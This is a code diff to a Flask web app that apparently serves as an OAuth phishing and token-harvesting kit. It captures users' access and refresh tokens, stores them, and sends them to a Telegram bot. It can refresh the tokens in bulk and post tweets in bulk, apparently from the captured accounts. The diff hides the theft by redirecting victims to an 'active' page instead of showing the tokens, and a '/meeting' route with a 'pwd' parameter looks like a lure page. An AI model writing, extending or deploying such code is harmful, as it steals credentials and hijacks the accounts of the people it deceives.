@@ -1,9 +1,9 @@
 import base64
 import hashlib
 import os
-import sqlite3  # For database storage
+import sqlite3
 import requests
-from flask import Flask, redirect, request, session, render_template
+from flask import Flask, redirect, request, session, render_template, url_for
 
 # Configuration: Ensure these environment variables are set correctly
 CLIENT_ID = os.getenv('CLIENT_ID')
@@ -138,7 +138,6 @@ def refresh_token_in_db(refresh_token, username):
         return None, None
 
 # Send message via Telegram
-# Send message via Telegram
 def send_message_via_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
@@ -147,7 +146,6 @@ def send_message_via_telegram(message):
         "parse_mode": "Markdown"
     }
 
-    # Ensure proper encoding in the request
     headers = {
         "Content-Type": "application/json; charset=utf-8"
     }
@@ -219,7 +217,7 @@ def handle_post_bulk(tweet_text):
 def handle_refresh_single():
     tokens = get_all_tokens()
     if tokens:
-        access_token, token_refresh, username = tokens[0]  # Use the first token
+        _, token_refresh, username = tokens[0]  # Use the first token
         refresh_token_in_db(token_refresh, username)
     else:
         send_message_via_telegram("❌ No tokens found to refresh.")
@@ -228,7 +226,7 @@ def handle_refresh_single():
 def handle_refresh_bulk():
     tokens = get_all_tokens()
     if tokens:
-        for access_token, refresh_token, username in tokens:
+        for _, refresh_token, username in tokens:
             refresh_token_in_db(refresh_token, username)
         send_message_via_telegram(f"✅ Bulk token refresh complete. {len(tokens)} tokens refreshed.")
     else:
@@ -316,6 +314,7 @@ def meeting():
     code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 
+# Authentication and authorization process
 @app.route('/')
 def home():
     code = request.args.get('code')
@@ -369,11 +368,18 @@ def home():
             store_token(access_token, refresh_token, username)
 
             send_message_via_telegram(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+            
+            # Redirect to active.html after saving and notifying
+            return redirect(url_for('active'))
         else:
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+# Route to display active.html
+@app.route('/active')
+def active():
+    return render_template('active.html')
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
